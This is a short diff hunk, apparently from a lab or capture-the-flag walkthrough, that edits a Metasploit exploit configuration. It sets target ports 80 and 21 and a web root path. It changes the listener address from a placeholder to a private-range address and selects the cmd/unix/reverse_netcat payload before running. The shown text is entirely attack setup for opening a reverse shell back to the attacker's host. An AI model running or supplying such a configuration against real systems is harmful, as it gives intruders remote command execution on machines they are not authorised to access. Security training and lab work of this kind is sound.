@@ -126,7 +126,7 @@ set RPORT 80
 set RPORT_FTP 21
 set SITEPATH /var/www/html
 set TARGETURI /
-set LHOST <attacker_ip>
+set LHOST 192.168.x.x
 set PAYLOAD cmd/unix/reverse_netcat
 run
 ```
